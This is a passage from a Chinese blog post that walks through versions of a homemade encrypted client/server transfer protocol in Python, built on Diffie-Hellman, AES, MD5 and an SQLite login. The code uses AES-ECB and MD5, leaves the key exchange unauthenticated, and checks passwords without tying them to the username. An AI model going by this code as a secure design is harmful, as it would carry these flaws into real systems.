&quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import math</span><br><span class="line">import random</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):</span><br><span class="line">    key = shared_key[:16]  # 确保密钥长度符合要求（256 位）</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    data_bytes = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;进行身份验证&quot;)</span><br><span class="line">    key = shared_key[:16]  # 确保密钥长度符合要求（256 位）</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print(text)</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        encrypt_password = encrypt_data(shared_key,password)</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key):</span><br><span class="line">    print((s.recv(1024)).decode())</span><br><span class="line">    username = input(&quot;输入用户名&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    password = input(&quot;输入密码&quot;)</span><br><span class="line">    encrypt_password = encrypt_data(shared_key,password)</span><br><span class="line">    s.send(encrypt_password)</span><br><span class="line">    print((s.recv(1024)).decode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line">        choice = input(&quot;输入选项:&quot;)</span><br><span class="line">        s.send(choice.encode())</span><br><span class="line">        if choice == &quot;3&quot;:</span><br><span class="line">            register(s,shared_key)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="传输阶段的数据加密"><a href="#传输阶段的数据加密" class="headerlink" title="传输阶段的数据加密"></a>传输阶段的数据加密</h1><p>这一章节的目的是设计出来一个数据包格式<br>常规的应该是由这几个部分组成 包头+密文长度+密文+校验和<br>这就要设计到两个算法 消息加密算法以及消息摘要算法<br>加密还是老样子 使用dh算法得到的共享密钥来进行aes加密<br>摘要算法的目的是为了保证消息的完整性<br>这里就使用md5算法<br>目前打算将数据包格式定义成下图所示<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411011046913.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411011046913.png" alt="image.png"></a><br>消息类型负责优化原本的服务端和客户端 原本的服务端针对传输数据类型不同以及新增用户的功能 是采用了菜单形式 过于简单且多了许多额外的交互 这里选择将choice变量融合到数据中一起传输<br>然后还得完善上一章节预留的 传输文件 这里打算暂时只包括传输图像 音频 文本文件 更多的格式和文件类型由于没有经过测试 不知道能不能完整的传输过去<br>对于服务端来说 接受到文件后 还需要判断属于哪种类型的文件 方便保存<br>想到的是两种方案  一种是客户端发送文件的时候额外发送文件的类型 服务端接受后按照类型保存文件<br>第二种是 在服务端接受数据后利用magic库来判断文件类型<br>但是这两种方法 似乎都很容易被绕过 要是客户端将马伪造成正常格式的文件传过来就不好玩了<br>虽然但是 本次只是打算设计一个能用的安全协议 所以安全性这里就只是预警一下 不去研究如何改进了 这里采用第二种方法<br>在编写传输图像文件的时候 遇到了一个新的问题<br>按照上面的数据包 单个数据包最多传输0xffffbytes 但是一个图像不止这些字节 所以就需要分段传输  那么我们就需要在数据包格式中的消息类型 加入是否属于切片传输的位置 来供服务端判断<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411011809966.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411011809966.png" alt="image.png"></a><br>迭代了数据包格式 前面的判断位之所以给了4byte 考虑到服务端处理切片数据的时候 需要确定当前是否属于最后一个切片(常规的协议一般在数据包中增加当前切片对于整段数据的偏移 这里我打算做简单一点) 所以前2个byte用来存储一共有多少个切片 后两个byte用来存储当前是第几个切片<br>而检测是否属于切片数据包也很容易 只要这4个byte不为\x00即可<br>同时 这个版本还优化了之前代码中的一些逻辑漏洞 容易造成服务端的server运行中断</p><h2 id="v0-4"><a href="#v0-4" class="headerlink" title="v0.4"></a>v0.4</h2><p>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import magic</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">users = [&#x27;user1&#x27;,&#x27;user2&#x27;,&#x27;user3&#x27;]</span><br><span class="line">passwds = [&#x27;aaaa&#x27;,&#x27;bbbb&#x27;,&#x27;cccc&#x27;]</span><br><span class="line"></span><br><span class="line">mime = magic.Magic(mime=True)</span><br><span class="line">conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    # 创建 MD5 哈希对象</span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    # 更新哈希对象</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line"></span><br><span class="line">    # 获取十六进制的哈希值</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_server):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    public_key_client = sock.recv(1024)</span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client),sock,addr</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):   #data要为byte型</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16)).decode() </span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def unpack_data(sock,shared_key,orign_data):</span><br><span class="line">    sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;)</span><br><span class="line">    sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_md5 = (orign_data[-32:]).decode()</span><br><span class="line">    base_data = decrypt_data(shared_key,orign_data[12:(data_length-32)])</span><br><span class="line">    data = base64.b64decode(base_data.encode())</span><br><span class="line">    value = verify_md5(data,data_md5,sock)</span><br><span class="line">    if value == 0:</span><br><span class="line">        sock.send(f&quot;第&#123;sliced_num+1&#125;组数据校验失败&quot;.encode())</span><br><span class="line">    else :</span><br><span class="line">        sock.send(f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;.encode())</span><br><span class="line">    return sliced_sum,sliced_num,data_type,data,value</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def Authentication(sock,shared_key,cursor):</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    username = decrypt_data(shared_key,username)</span><br><span class="line">    cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    if result != None:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        print(&quot;用户名正确&quot;)</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        decrypted_password = aes.decrypt(password)</span><br><span class="line">        password = (unpad(decrypted_password, 16)).decode()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE password = ?&quot;, (password,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            print(&quot;密码正确&quot;)</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1</span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0</span><br><span class="line">            return permission_value</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            sock.close()</span><br><span class="line">            return 3</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">        return 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;开始进行数据传输 请按照规定格式发送数据&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_txt(addr,data):</span><br><span class="line">    print(f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def transfer_file(sock,data):</span><br><span class="line">    data_type = mime.from_buffer(data)</span><br><span class="line">    if data_type == &quot;text/plain&quot;:</span><br><span class="line">        with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data.encode())</span><br><span class="line">    sock.send(&quot;成功接受到文件\n&quot;.encode())</span><br><span class="line"></span><br><span class="line">def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key):</span><br><span class="line">    data_bytes = data</span><br><span class="line">    while sliced_num != sliced_sum-1:</span><br><span class="line">        orign_data = (sock.recv(2048))</span><br><span class="line">        sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">        data_bytes += data</span><br><span class="line">    data_type = mime.from_buffer(data_bytes)</span><br><span class="line">    if data_type == &quot;image/png&quot;:</span><br><span class="line">        with open(&quot;output.png&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data_bytes)</span><br><span class="line">    sock.send(&quot;成功接受到文件\n&quot;.encode())</span><br><span class="line">    # if data_type == &quot;text/plain&quot;:</span><br><span class="line">    #     with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">    #         f.write(data_bytes)</span><br><span class="line">    # sock.send(&quot;成功接受到文件&quot;.encode())</span><br><span class="line"></span><br><span class="line">def register(permission_value,sock,shared_key,cursor,data):</span><br><span class="line">    if permission_value == 0:</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        return</span><br><span class="line">    else :  </span><br><span class="line">        parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">        username = parts[0]</span><br><span class="line">        password = parts[1]</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password))</span><br><span class="line">            conn.commit()</span><br><span class="line">            sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line"></span><br><span class="line">def verify_md5(data, original_md5,sock):</span><br><span class="line">    current_md5 = md5_encrypt(data)</span><br><span class="line">    return current_md5 == original_md5</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    while 1:</span><br><span class="line">        public_key_client,sock,addr = key_switch(s,public_key_server)</span><br><span class="line">        print(&quot;公钥交换成功&quot;)</span><br><span class="line">        print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">        shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">        print(&quot;等待连接中&quot;)</span><br><span class="line">        print(sock,addr)</span><br><span class="line">        print(&quot;开始进行身份验证&quot;)</span><br><span class="line">        permission_value = Authentication(sock,shared_key,cursor)</span><br><span class="line">        if permission_value == 3:</span><br><span class="line">            continue</span><br><span class="line">        while 1:</span><br><span class="line">            menu(sock)</span><br><span class="line">            orign_data = (sock.recv(2048))</span><br><span class="line">            if len(orign_data) == 0:</span><br><span class="line">                break</span><br><span class="line">            sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">            if data_type == 1:</span><br><span class="line">                transfer_txt(addr,data)</span><br><span class="line">            elif data_type == 2:</span><br><span class="line">                if sliced_sum != 0 or sliced_num != 0:</span><br><span class="line">                    transfer_file2(sock,data,sliced_sum,sliced_num,shared_key)</span><br><span class="line">                else:</span><br><span class="line">                    transfer_file(sock,data)</span><br><span class="line">            elif data_type ==3:</span><br><span class="line">                register(permission_value,sock,shared_key,cursor,data)</span><br><span class="line">        sock.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice_text = &quot;&quot;&quot;</span><br><span class="line">1.传输文本数据</span><br><span class="line">2.传输文件数据</span><br><span class="line">3.新增用户</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    # 创建 MD5 哈希对象</span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    # 更新哈希对象</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line"></span><br><span class="line">    # 获取十六进制的哈希值</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,base_data,shared_key,sliced,sum,data):</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,base_data.decode())</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp</span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    data_bytes = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;进行身份验证&quot;)</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print(text)</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        encrypt_password = encrypt_data(shared_key,password)</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key):</span><br><span class="line">    username = input(&quot;输入用户名 :&quot;)</span><br><span class="line">    password = input(&quot;输入密码 :&quot;)</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    base_data = base64.b64encode(data.encode())</span><br><span class="line">    transfer_data = pack_data(3,base_data,shared_key,0,0,data.encode())</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key):</span><br><span class="line">    text = input(&quot;输入数据 :&quot;)</span><br><span class="line">    if len(text) &gt; 1000:</span><br><span class="line">        sliced = 0</span><br><span class="line">        base64_text = base64.b64encode(text.encode())</span><br><span class="line">        chunk_size = 1000</span><br><span class="line">        sliced_data = slice_string(base64_text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum,sliced_data[i])</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        base_text = base64.b64encode(text.encode())</span><br><span class="line">        transfer_data = pack_data(1,base_text,shared_key,sliced,sliced_sum,text.encode())</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key):</span><br><span class="line">    file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;)</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1000:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1000</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\n&quot;)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            sliced_basedata = base64.b64encode(sliced_data[i])</span><br><span class="line">            transfer_data = pack_data(2,sliced_basedata,shared_key,sliced,sliced_sum,sliced_data[i])</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">            print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        base_text = base64.b64encode(text)</span><br><span class="line">        transfer_data = pack_data(2,base_text,shared_key,sliced,sliced_sum,text)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line">        choice = input(choice_text)</span><br><span class="line">        if choice == &quot;1&quot;:</span><br><span class="line">            transfer_txt(s,shared_key)</span><br><span class="line">        elif choice == &quot;2&quot;:</span><br><span class="line">            transfer_file(s,shared_key)</span><br><span class="line">        elif choice == &quot;3&quot;:</span><br><span class="line">            register(s,shared_key)</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;未找到输入的选项，请重新输入&quot;)</span><br><span class="line">            continue</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="代码迭代"><a href="#代码迭代" class="headerlink" title="代码迭代"></a>代码迭代</h1><p>针对一个简单协议所需要的功能已经大体实现了 接下来的任务就是优化服务端和客户端的代码<br>主要的目标大致如下<br>1.添加图形化界面 优化交互过程<br>2.优化代码逻辑 增加注释 提高代码美观度<br>3.完善程序功能</p><h2 id="v0-5"><a href="#v0-5" class="headerlink" title="v0.5"></a>v0.5</h2><p>该版本优化了代码逻辑 完善了注释<br>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice_text = &quot;&quot;&quot;</span><br><span class="line">        1.传输文本数据</span><br><span class="line">        2.传输文件数据</span><br><span class="line">        3.新增用户</span><br><span class="line">输入选项:</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):  #md5加密 用于完整性检测 </span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,base_data,shared_key,sliced,sum,data):  #将数据打包成报文 格式:  sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes)</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,base_data.decode())</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp </span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):   #交换公钥</span><br><span class="line">    print(&quot;等待连接服务端&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    print(&quot;连接上服务端 开始进行公钥交换&quot;)</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(   </span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):  #aes加密</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    data_bytes = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;开始进行身份验证&quot;)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)   #用户名经过aes加密后传输</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print(text)</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">def 